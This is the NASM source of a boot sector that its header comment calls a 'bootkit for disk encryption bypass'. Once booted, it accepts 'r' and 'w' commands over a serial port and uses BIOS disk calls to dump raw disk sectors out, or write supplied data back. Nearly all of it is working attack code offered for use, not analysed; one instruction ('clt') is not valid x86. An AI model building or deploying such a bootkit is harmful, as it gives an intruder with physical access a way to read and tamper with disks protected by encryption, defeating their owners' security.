; bootkit for disk encryption bypass
; 15/06/2016 
; -snp
; 

%define BOOT_START              0x7C00
%define SECTOR_SIZE             512
%define BOOT_SECTOR_SIZE        SECTOR_SIZE * 2
%define BOOT_STACK_SIZE         512 

%define BOOT_SP                 (BOOT_START + BOOT_SECTOR_SIZE + BOOT_STACK_SIZE - 2)

%define SECTOR_DATA				BOOT_SP + 0x100

%define SECTOR_START			0x800 	; can be mapped reading VPT

%define SERIAL_PORT 			0x3f8	

%include "macros.asm"

[bits 16]
[org BOOT_START]
	nop

start:
 	xor   ax, ax
 	mov   ds, ax
 	mov   ss, ax
	mov   es, ax
	mov   fs, ax
 	mov   sp, BOOT_SP
 
	serial_init
	
main_loop:
	mov word [buffer.count], 1 
	mov bx, buffer.data
	call serial_read

	cmp byte [buffer.data], 'r'
	jz cmd_read					; read sectors from disk

	cmp byte [buffer.data], 'w'
	jz cmd_write				; write sectors to disk

	jmp main_loop

    clt
	jmp $

cmd_read:
	call _cmd_read
	jmp main_loop
 
cmd_write:
	call _cmd_write
	jmp main_loop

_cmd_read:
	read_packet
	prepare_packet

	call read_disk

	mov ax, 512
	mul word [DPA_PACKET.sectors]

	mov word [buffer.total], ax
	mov si, SECTOR_DATA
	call serial_write_ex
	ret

_cmd_write:
	read_packet
	xor dx, dx
	prepare_packet
	push dx

	mov ax, 512
	mul word [DPA_PACKET.sectors]
	mov word [buffer.count], ax
	mov bx, SECTOR_DATA
	call serial_read

	pop dx
	call write_disk

	ret

read_disk:
	mov ah, 0x42
	mov si, DPA_PACKET
    int 0x13
    jnc .ret
    io_error data.ioerror_read
.ret:
    ret

write_disk:
	mov ah, 0x43
	mov si, DPA_PACKET
    int 0x13
    jnc .ret
    io_error data.ioerror_write
	
.ret:
    ret

strlen:
	xor bx, bx
.loop:
	inc bx
	lodsb
	test al, al
	jnz .loop
	mov ax, bx
	ret

%include "serial.asm"

;--------------------------------------------------------------------------
DPA_PACKET:
 .size	   db 10h
 .reserved db 0
 .sectors  dw 1
 .buff_lo  dw SECTOR_DATA
 .buff_hi  dw 0
 .startlo  dd SECTOR_START
 .starthi  dd 0

;--------------------------------------------------------------------------
data:
  .ioerror_read  db "error reading sectors!",10,0
  .ioerror_write db "error writing sectors!",10,0
  .msg_success	 db "payload worked!",10,0

;--------------------------------------------------------------------------
;--------------------------------------------------------------------------
 times 512-2-($-$$) db 0 
 db 0x55         
 db 0xAA

;--------------------------------------------------------------------------
packet:
  .disk     db 0
  .sectors  dw 0
  .startlo  dd 0

buffer:
.count 		dw 	 0
.total 		dw 	 0
.data 		db	 0


